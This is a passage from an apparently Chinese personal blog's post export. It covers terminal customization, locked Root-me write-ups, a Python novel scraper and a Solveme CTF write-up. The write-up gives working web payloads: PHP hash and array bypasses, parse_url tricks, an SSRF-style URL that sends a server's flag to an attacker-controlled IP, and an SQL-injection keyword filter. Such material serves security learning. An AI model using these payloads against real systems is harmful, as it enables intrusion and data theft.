class=\"string\">\"&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"hidden\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"Azure\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"source\"</span>: <span class=\"string\">\"Windows.Terminal.Azure\"</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"attr\">\"guid\"</span>: <span class=\"string\">\"&#123;b453ae62-4e3d-5e58-b989-0a998ec44156&#125;\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"Python InterAction\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"commandline\"</span>: <span class=\"string\">\"py\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"hidden\"</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Add custom color schemes to this array.</span></span><br><span class=\"line\">    <span class=\"comment\">// To learn more about color schemes, visit https://aka.ms/terminal-color-schemes</span></span><br><span class=\"line\">    <span class=\"attr\">\"schemes\"</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                <span class=\"attr\">\"name\"</span> : <span class=\"string\">\"Frost\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"background\"</span> : <span class=\"string\">\"#FFFFFF\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"black\"</span> : <span class=\"string\">\"#3C5712\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"blue\"</span> : <span class=\"string\">\"#17b2ff\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"brightBlack\"</span> : <span class=\"string\">\"#749B36\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"brightBlue\"</span> : <span class=\"string\">\"#27B2F6\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"brightCyan\"</span> : <span class=\"string\">\"#13A8C0\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"brightGreen\"</span> : <span class=\"string\">\"#89AF50\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"brightPurple\"</span> : <span class=\"string\">\"#F2A20A\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"brightRed\"</span> : <span class=\"string\">\"#F49B36\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"brightWhite\"</span> : <span class=\"string\">\"#741274\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"brightYellow\"</span> : <span class=\"string\">\"#991070\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"cyan\"</span> : <span class=\"string\">\"#3C96A6\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"foreground\"</span> : <span class=\"string\">\"#000000\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"green\"</span> : <span class=\"string\">\"#6AAE08\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"purple\"</span> : <span class=\"string\">\"#991070\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"red\"</span> : <span class=\"string\">\"#8D0C0C\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"white\"</span> : <span class=\"string\">\"#6E386E\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"yellow\"</span> : <span class=\"string\">\"#991070\"</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Add custom keybindings to this array.</span></span><br><span class=\"line\">    <span class=\"comment\">// To unbind a key combination from your defaults.json, set the command to \"unbound\".</span></span><br><span class=\"line\">    <span class=\"comment\">// To learn more about keybindings, visit https://aka.ms/terminal-keybindings</span></span><br><span class=\"line\">    <span class=\"attr\">\"keybindings\"</span>:</span><br><span class=\"line\">    [</span><br><span class=\"line\">        <span class=\"comment\">// Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json.</span></span><br><span class=\"line\">        <span class=\"comment\">// These two lines additionally bind them to Ctrl+C and Ctrl+V.</span></span><br><span class=\"line\">        <span class=\"comment\">// To learn more about selection, visit https://aka.ms/terminal-selection</span></span><br><span class=\"line\">        &#123; <span class=\"attr\">\"command\"</span>: &#123;<span class=\"attr\">\"action\"</span>: <span class=\"string\">\"copy\"</span>, <span class=\"attr\">\"singleLine\"</span>: <span class=\"literal\">false</span> &#125;, <span class=\"attr\">\"keys\"</span>: <span class=\"string\">\"ctrl+c\"</span> &#125;,</span><br><span class=\"line\">        &#123; <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"paste\"</span>, <span class=\"attr\">\"keys\"</span>: <span class=\"string\">\"ctrl+v\"</span> &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Press Ctrl+Shift+F to open the search box</span></span><br><span class=\"line\">        &#123; <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"find\"</span>, <span class=\"attr\">\"keys\"</span>: <span class=\"string\">\"ctrl+shift+f\"</span> &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Press Alt+Shift+D to open a new pane.</span></span><br><span class=\"line\">        <span class=\"comment\">// - \"split\": \"auto\" makes this pane open in the direction that provides the most surface area.</span></span><br><span class=\"line\">        <span class=\"comment\">// - \"splitMode\": \"duplicate\" makes the new pane use the focused pane's profile.</span></span><br><span class=\"line\">        <span class=\"comment\">// To learn more about panes, visit https://aka.ms/terminal-panes</span></span><br><span class=\"line\">        &#123; <span class=\"attr\">\"command\"</span>: &#123; <span class=\"attr\">\"action\"</span>: <span class=\"string\">\"splitPane\"</span>, <span class=\"attr\">\"split\"</span>: <span class=\"string\">\"auto\"</span>, <span class=\"attr\">\"splitMode\"</span>: <span class=\"string\">\"duplicate\"</span> &#125;, <span class=\"attr\">\"keys\"</span>: <span class=\"string\">\"alt+shift+d\"</span> &#125;,</span><br><span class=\"line\">        &#123;<span class=\"attr\">\"command\"</span>: <span class=\"string\">\"closeTab\"</span>, <span class=\"attr\">\"keys\"</span>: <span class=\"string\">\"ctrl+delete\"</span>&#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>最终效果如下：<br><img src=\"/2020/03/22/psbeautify/12.png\" alt></p>\n<h2 id=\"Fluent-Terminal\"><a href=\"#Fluent-Terminal\" class=\"headerlink\" title=\"Fluent Terminal\"></a>Fluent Terminal</h2><p>我最先使用的是这款，在github上搜索，然后下载后用ps运行文件夹下的<code>Install.ps1</code>即可，效果如下：</p>\n<p><img src=\"/2020/03/22/psbeautify/2.png\" alt></p>\n<p>比起PS来已经美观多了，不过吹毛求疵的我还是感觉到了一丝丝不爽：</p>\n<ol>\n<li>启动时有时会加载不出左侧的命令提示符，或者比较慢，需要按下回车才能出来，总之初始化有时会有点卡</li>\n<li>字体稍微有点模糊，锯齿略明显（在字体小的情况下），而且显示效果不舒服</li>\n<li>设置项较少，跟不上我<del>装X</del>追求完美的步伐</li>\n<li>复制粘贴时有点问题，有时候只能整行复制，选取不到某段字符</li>\n</ol>\n<h2 id=\"ConEmu\"><a href=\"#ConEmu\" class=\"headerlink\" title=\"ConEmu\"></a>ConEmu</h2><p><a href=\"https://www.fosshub.com/ConEmu.html\" target=\"_blank\" rel=\"noopener\">官网</a>下载安装即可</p>\n<h3 id=\"界面配置\"><a href=\"#界面配置\" class=\"headerlink\" title=\"界面配置\"></a>界面配置</h3><p>设置默认以PS启动</p>\n<p><img src=\"/2020/03/22/psbeautify/3.png\" alt></p>\n<p>设置字体</p>\n<p><img src=\"/2020/03/22/psbeautify/9.png\" alt></p>\n<p>设置背景图片</p>\n<p><img src=\"/2020/03/22/psbeautify/4.png\" alt></p>\n<p>设置PS为默认shell</p>\n<p><img src=\"/2020/03/22/psbeautify/5.png\" alt></p>\n<h3 id=\"设置配色\"><a href=\"#设置配色\" class=\"headerlink\" title=\"设置配色\"></a>设置配色</h3><p>使用colortool来进行设置，colortool是微软出的一个powershell配色工具，支持Iterm主题</p>\n<p>安装</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">scoop install colortool</span><br></pre></td></tr></table></figure>\n<p>待续</p>\n<p><strong>颜色设置</strong></p>\n<p>PS的字体颜色中有许多很暗的颜色的，比如在输入<code>-xxxx</code>选项是黑灰色，分辨度很差，我们可以自己修改成想要的颜色，点击”settings”，转到颜色选项卡</p>\n<p>选择自己喜欢的颜色方案</p>\n<p><img src=\"/2020/03/22/psbeautify/10.png\" alt></p>\n<p>然后下面第8个一般是暗色，这个就是控制上述选项的（我是和我shell中的颜色对比确定的），我们选择一个自己喜欢的颜色，效果如下，清楚了许多</p>\n<p><img src=\"/2020/03/22/psbeautify/11.png\" alt></p>\n<p>其它颜色修改也可以参照上面的方法自己DIY，最后记得要保存成自己的颜色方案</p>\n<h1 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h1><p><strong>cmder</strong>（该软件也有丰富的设置项，只是我没怎么搞而已，也是一个不错的软件）</p>\n<p><img src=\"/2020/03/22/psbeautify/6.png\" alt></p>\n<p><strong>Fluent Terminal</strong></p>\n<p><img src=\"/2020/03/22/psbeautify/7.png\" alt></p>\n<p><strong>ConEmu</strong></p>\n<p><img src=\"/2020/03/22/psbeautify/8.png\" alt></p>\n<hr>\n<p><a href=\"https://sspai.com/post/52868\" target=\"_blank\" rel=\"noopener\">https://sspai.com/post/52868</a><br><a href=\"https://iterm2colorschemes.com/\" target=\"_blank\" rel=\"noopener\">https://iterm2colorschemes.com/</a><br><a href=\"https://github.com/JanDeDobbeleer/oh-my-posh\" target=\"_blank\" rel=\"noopener\">https://github.com/JanDeDobbeleer/oh-my-posh</a></p>\n","categories":["教程"],"tags":["PowerShell","美化"]},{"title":"Rootme网站做题记录(一)","url":"/2019/07/31/rootme/","content":"<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n<div id=\"hbe-security\">\n  <div class=\"hbe-input-container\">\n  <input type=\"password\" class=\"hbe-form-control\" id=\"pass\" placeholder=\"官方不建议公布wp，所以加密。可以email交流\" />\n    <label for=\"pass\">官方不建议公布wp，所以加密。可以email交流</label>\n    <div class=\"bottom-line\"></div>\n  </div>\n</div>\n<div id=\"decryptionError\" style=\"display: none;\">Incorrect Password!</div>\n<div id=\"noContentError\" style=\"display: none;\">No content to display!</div>\n<div id=\"encrypt-blog\" style=\"display:none\">\\n</div>\n<script src=\"/lib/crypto-js.js\"></script><script src=\"/lib/blog-encrypt.js\"></script><link href=\"/css/blog-encrypt.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["writeup"],"tags":["CTF"]},{"title":"Rootme网站做题记录(二)","url":"/2019/08/06/rootme1/","content":"<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n<div id=\"hbe-security\">\n  <div class=\"hbe-input-container\">\n  <input type=\"password\" class=\"hbe-form-control\" id=\"pass\" placeholder=\"Password plz...\" />\n    <label for=\"pass\">Password plz...</label>\n    <div class=\"bottom-line\"></div>\n  </div>\n</div>\n<div id=\"decryptionError\" style=\"display: none;\">Incorrect Password!</div>\n<div id=\"noContentError\" style=\"display: none;\">No content to display!</div>\n<div id=\"encrypt-blog\" style=\"display:none\">\\n</div>\n<script src=\"/lib/crypto-js.js\"></script><script src=\"/lib/blog-encrypt.js\"></script><link href=\"/css/blog-encrypt.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["writeup"],"tags":["CTF"]},{"title":"Spider攻城记","url":"/2017/12/15/spider1/","content":"<p>刚刚起步，先来点东西水一水…<br><a id=\"more\"></a></p>\n<h3 id=\"为什么要干这个呢\"><a href=\"#为什么要干这个呢\" class=\"headerlink\" title=\"为什么要干这个呢\"></a>为什么要干这个呢</h3><p>　　最近突然想看《细说隋唐》，但是网上找资源很难找，好不容易找到一个在线阅读网站但是这个网站的页面不能自动适应手机界面，很烦，而且不能自动切换到下一章，每一次都得返回目录页找下一章，而且页面上还有广告QAQ~~…总之不舒服，于是突发奇想做个爬虫（spider）把内容爬下来，然后导入手机观看，这样岂不是很有逼格？！说干就干。<br>　　目标网址<a href=\"http://www.saohua.com/shuku/xishuosuitang\" target=\"_blank\" rel=\"noopener\">Link</a></p>\n<h3 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h3><p>　　python、掌阅（一款电子书APP）、python包BeautifulSoup4</p>\n<h3 id=\"分析URL\"><a href=\"#分析URL\" class=\"headerlink\" title=\"分析URL\"></a>分析URL</h3><p>　　每个具体章节例如第5章http://www.saohua.com/shuku/xishuosuitang/ldf06.htm，发现第i章URL为http://www.saohua.com/shuku/xishuosuitang/ldf<font color=\"#00ffff\" size=\"3\"><strong>i-5</strong></font>.htm</p>\n<h3 id=\"开始攻城\"><a href=\"#开始攻城\" class=\"headerlink\" title=\"开始攻城\"></a>开始攻城</h3><p>　　既然规律找到了那么接下来就好办了，这里还有一个问题，掌阅可以自动生成目录，其实是把你的txt文件中的第几回第几章等自动生成，所以文件里要有第几章所以加了一段转换代码生成”第几章”字样，贴一下代码。<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">import urllib.request as u</span><br><span class=\"line\">from bs4 import BeautifulSoup </span><br><span class=\"line\"></span><br><span class=\"line\">f=open(<span class=\"string\">'a.txt'</span>,<span class=\"string\">'w+'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(22,111):</span><br><span class=\"line\">\turl=<span class=\"string\">\"http://www.saohua.com/shuku/xishuosuitang/ldf\"</span>+str(i)+<span class=\"string\">\".htm\"</span></span><br><span class=\"line\">\tres=u.urlopen(url)</span><br><span class=\"line\">\thtml=res.read().decode(<span class=\"string\">'gbk'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tsoup = BeautifulSoup(html,<span class=\"string\">'lxml'</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> range(2):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> data <span class=\"keyword\">in</span> soup.find_all(<span class=\"string\">'font'</span>)[col]:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(data.string!=<span class=\"string\">'HTMLBUILERPART0'</span> and data.string!=<span class=\"string\">'/HTMLBUILERPART0'</span>):</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(data.string==None):</span><br><span class=\"line\">\t\t\t\t\tf.write(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">elif</span>(str(i-5) <span class=\"keyword\">in</span> data.string):</span><br><span class=\"line\">\t\t\t\t\tf.write(<span class=\"string\">'第'</span>+str(i-5)+<span class=\"string\">'回:'</span>+data.string)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span>:\t </span><br><span class=\"line\">\t\t\t\t\tf.write(data.string)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure></p>\n<p>运行一下，大概三四秒钟…</p>\n<pre><code class=\"lang-bash\">C:\\Users\\xxx\\Desktop&gt;python spider.py\n</code></pre>\n<h3 id=\"导入手机\"><a href=\"#导入手机\" class=\"headerlink\" title=\"导入手机\"></a>导入手机</h3><p>这部分大家应该都会吧，打开掌阅导入一下就可以看了。</p>\n<h3 id=\"填坑总结\"><a href=\"#填坑总结\" class=\"headerlink\" title=\"填坑总结\"></a>填坑总结</h3><p>1.好好学英语吧，BeautifulSoup官方文档是靠着Google浏览器自动翻译的，研究了半天。<br>2.还有需要注意文字编码问题。<br>3.由于这个网站没有屏蔽爬虫，所以简单代码就可以。<br>4.{%raw%}{%endraw%}可以使输入的文本不被解析。</p>\n","categories":["教程"],"tags":["Spider","Python"]},{"title":"Solveme题解","url":"/2018/07/31/solveme/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下</p>\n<a id=\"more\"></a>\n<h1 id=\"Warm-up\"><a href=\"#Warm-up\" class=\"headerlink\" title=\"Warm up\"></a>Warm up</h1><p>逆向跑一遍即可</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$flag = <span class=\"string\">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> hex2bin(strrev(bin2hex(base64_decode($flag))));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"Bad-compare\"><a href=\"#Bad-compare\" class=\"headerlink\" title=\"Bad compare\"></a>Bad compare</h1><p>这个题目是字符串在不同编码下显示不同的问题，如果直接复制粘贴比较的会发生错误，办法是bp抓包查看16进制值提交上去就可以正确比较啦</p>\n<h1 id=\"Winter-sleep\"><a href=\"#Winter-sleep\" class=\"headerlink\" title=\"Winter sleep\"></a>Winter sleep</h1><p>利用PHP的数字解析漏洞，payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?time&#x3D;6e6</span><br></pre></td></tr></table></figure>\n<h1 id=\"Hard-login\"><a href=\"#Hard-login\" class=\"headerlink\" title=\"Hard login\"></a>Hard login</h1><p>这个题目想得到flag就是需要让username和passwd和它隐藏的相等，看到用户名只有三位猜测可能是考察爆破，但是没有爆破成功，到这儿就卡住了，最后看了一下学长博客，才知道这题要用到 <code>curl</code>，这个命令之前几乎没用过，算是一个新知识点，得学习一下了。不知道为什么直接在浏览器中访问index.php页面就不行，用curl命令就可以</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http:&#x2F;&#x2F;hardlogin.solveme.peng.kr&#x2F;index.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"URL-filtering\"><a href=\"#URL-filtering\" class=\"headerlink\" title=\"URL filtering\"></a>URL filtering</h1><p>分析代码可知，代码大概思路是解析一下url(parse_url)，对于得到的字符串用&amp;分隔为数组，在对于每个数组值以等号分隔出key,value对，要求key中不能出现 <code>do_you_want_flag</code>,value中不能出现 <code>yes</code>，但是再获取flag时又要求必须是 <code>do_you_want_flag=yes</code>，显然是矛盾的，但是在翻看PHP手册查看parse_url函数时发现一句话</p>\n<blockquote>\n<p>对严重不合格的 URL，parse_url() 可能会返回 FALSE。</p>\n</blockquote>\n<p>所以猜测可能是这个parse函数存在突破点，搜索一下发现有个GeekPwn2016ctf比赛中就考过这个知识点，得到payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;urlfiltering.solveme.peng.kr&#x2F;&#x2F;&#x2F;?do_you_want_flag&#x3D;yes</span><br></pre></td></tr></table></figure>\n<h1 id=\"Hash-collision\"><a href=\"#Hash-collision\" class=\"headerlink\" title=\"Hash collision\"></a>Hash collision</h1><p>直接数组绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?foo[]&#x3D;1&amp;bar[]&#x3D;2</span><br></pre></td></tr></table></figure>\n<h1 id=\"Array2String\"><a href=\"#Array2String\" class=\"headerlink\" title=\"Array2String\"></a>Array2String</h1><p>题目核心在于提交 <code>15th_HackingCamp</code>对应的ascii码值，但是流程又限制数字不能在(32,127)之间，官网查找一下chr函数的描述可以看到如下描述</p>\n<blockquote>\n<p>Note that if the number is higher than 256, it will return the number mod 256.</p>\n</blockquote>\n<p>就是说如果数字大于256的话它会自动取模，所以就简单了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;array2string.solveme.peng.kr&#x2F;index.php?password&#x3D;simple_passw0rd&amp;value[]&#x3D;305&amp;value[]&#x3D;309&amp;value[]&#x3D;372&amp;value[]&#x3D;360&amp;value[]&#x3D;351&amp;value[]&#x3D;328&amp;value[]&#x3D;353&amp;value[]&#x3D;355&amp;value[]&#x3D;363&amp;value[]&#x3D;361&amp;value[]&#x3D;366&amp;value[]&#x3D;359&amp;value[]&#x3D;323&amp;value[]&#x3D;353&amp;value[]&#x3D;365&amp;value[]&#x3D;368</span><br></pre></td></tr></table></figure>\n<h1 id=\"Flag-not-found\"><a href=\"#Flag-not-found\" class=\"headerlink\" title=\"Flag not found\"></a>Flag not found</h1><h1 id=\"Give-me-a-link-2\"><a href=\"#Give-me-a-link-2\" class=\"headerlink\" title=\"Give me a link 2\"></a>Give me a link 2</h1><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'url'</span>]))&#123;</span><br><span class=\"line\">    $url = $_GET[<span class=\"string\">'url'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/_|\\s|\\0/'</span>, $url))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Not allowed character'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$parse = parse_url($url);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^https?$/i'</span>, $parse[<span class=\"string\">'scheme'</span>]))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Not allowed scheme'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^(localhost|127\\.\\d+\\.\\d+\\.\\d+|[^.]+)(\\:\\d+)?$/i'</span>, $parse[<span class=\"string\">'host'</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Not allowed host'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/\\/plz_give_me$/'</span>, $parse[<span class=\"string\">'path'</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Not allowed path'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>分析代码，题目过滤了几个条件</p>\n<blockquote>\n<p>1、 url中不能出现 <code>_</code> 以及其他不可见字符<br>2、 path字段中又必须出现 <code>plz_give_me</code> 字段<br>3、 限制输入的网址必须是 <code>localhost</code> 或 <code>127.x.x.x</code> 这种类型的网址</p>\n</blockquote>\n<p>1和2冲突，可以用前面一题的方法绕过之<br>对于第三个，有个绕过方法就是 <code>ip2long()</code> 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤</p>\n<p>所以最终payload为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;givemealink2.solveme.peng.kr&#x2F;?url&#x3D;https:num_ip:12580&#x2F;plz%0agive%0ame</span><br></pre></td></tr></table></figure>\n<h1 id=\"Give-me-a-link\"><a href=\"#Give-me-a-link\" class=\"headerlink\" title=\"Give me a link\"></a>Give me a link</h1><p>关键代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/_|\\s|\\0/'</span>, $url))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Not allowed character'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^https?\\:\\/\\/'</span>.$_SERVER[<span class=\"string\">'HTTP_HOST'</span>].<span class=\"string\">'/i'</span>, $url))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Not allowed URL'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $parse = parse_url($url);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($parse[<span class=\"string\">'path'</span>] !== <span class=\"string\">'/plz_give_me'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Not allowed path'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_URL, $parse[<span class=\"string\">'scheme'</span>].<span class=\"string\">'://'</span>.$parse[<span class=\"string\">'host'</span>].<span class=\"string\">'/'</span>.$flag);</span><br></pre></td></tr></table></figure>\n<p>第一个和第三个的条件矛盾，具体参见前文，其中 <code>$_SERVER[&#39;HTTP_HOST&#39;]</code> 又和</p>\n<p><code>curl_setopt($ch, CURLOPT_URL, $parse[&#39;scheme&#39;].&#39;://&#39;.$parse[&#39;host&#39;].&#39;/&#39;.$flag);</code> </p>\n<p>矛盾，因为http_host内容找不不允许修改，但是查看PHP手册可知</p>\n<blockquote>\n<p>$url = ‘<a href=\"http://username:password@hostname/path?arg=value#anchor\" target=\"_blank\" rel=\"noopener\">http://username:password@hostname/path?arg=value#anchor</a>‘;</p>\n</blockquote>\n<p>这样的方式也可以解析url，所以构造</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;givemealink.solveme.peng.kr&#x2F;?url&#x3D;http:&#x2F;&#x2F;givemealink.solveme.peng.kr@ip_addr&#x2F;plz%1agive%1ame</span><br></pre></td></tr></table></figure>\n<p>注意要先监听80端口,还要不要用https，因为https返回的数据是乱码：）</p>\n<h1 id=\"Replace-filter\"><a href=\"#Replace-filter\" class=\"headerlink\" title=\"Replace filter\"></a>Replace filter</h1><p>关键代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'say'</span>]) &amp;&amp; strlen($_GET[<span class=\"string\">'say'</span>]) &lt; <span class=\"number\">20</span>)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $say = preg_replace(<span class=\"string\">'/^(.*)flag(.*)$/'</span>, <span class=\"string\">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class=\"string\">'say'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/give_me_the_flag/'</span>, $say))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'What the f**k?'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里看学长的博客get到了新姿势，这个题目绕过的点在 <code>.*</code> 这里，这个可以匹配任意字符，但是不可以匹配换行，而 <code>^$</code> 又限制了字符串必须在同一行，所以绕过就简单了，payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;replacefilter.solveme.peng.kr&#x2F;?say&#x3D;%0agive_me_the_flag</span><br></pre></td></tr></table></figure>\n<h1 id=\"Hell-JS\"><a href=\"#Hell-JS\" class=\"headerlink\" title=\"Hell JS\"></a>Hell JS</h1><h1 id=\"Anti-SQLi\"><a href=\"#Anti-SQLi\" class=\"headerlink\" title=\"Anti SQLi\"></a>Anti SQLi</h1><p>关键过滤如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">preg_match(</span><br><span class=\"line\">           <span class=\"string\">'/\\.|\\`|\"|\\'|\\\\|\\xA0|\\x0B|0x0C|\\t|\\r|\\n|\\0|'</span>.</span><br><span class=\"line\">           <span class=\"string\">'=|&lt;|&gt;|\\(|\\)|@@|\\|\\||&amp;&amp;|#|\\/\\*.*\\*\\/|--[\\s\\xA0]|'</span>.</span><br><span class=\"line\">           <span class=\"string\">'0x[0-9a-f]+|0b[01]+|x\\'[0-9a-f]+\\'|b\\'[01]+\\'|'</span>.</span><br><span class=\"line\">           <span class=\"string\">'[\\s\\xA0\\'\"]+(as|or|and|r*like|regexp)[\\s\\xA0\\'\"]+|'</span>.</span><br><span class=\"line\">           <span class=\"string\">'union[\\s\\xA0]+select|[\\s\\xA0](where|having)|'</span>.</span><br><span class=\"line\">           <span class=\"string\">'[\\s\\xA0](group|order)[\\s\\xA0]+by|limit[\\s\\xA0]+\\d|'</span>.</span><br><span class=\"line\">           <span class=\"string\">'information_schema|procedure\\s+analyse\\s*/is'</span>,</span><br><span class=\"line\">           $id.<span class=\"string\">','</span>.$pw</span><br><span class=\"line\">       ) <span class=\"keyword\">and</span> <span class=\"keyword\">die</span>(<span class=\"string\">'Hack detected'</span>);</span><br></pre></td></tr></table></figure>\n<p>sql语句即判断条件<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$result = mysqli_fetch_array(</span><br><span class=\"line\">            mysqli_query(</span><br><span class=\"line\">                $con, </span><br><span class=\"line\">                <span class=\"string\">\"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');\"</span></span><br><span 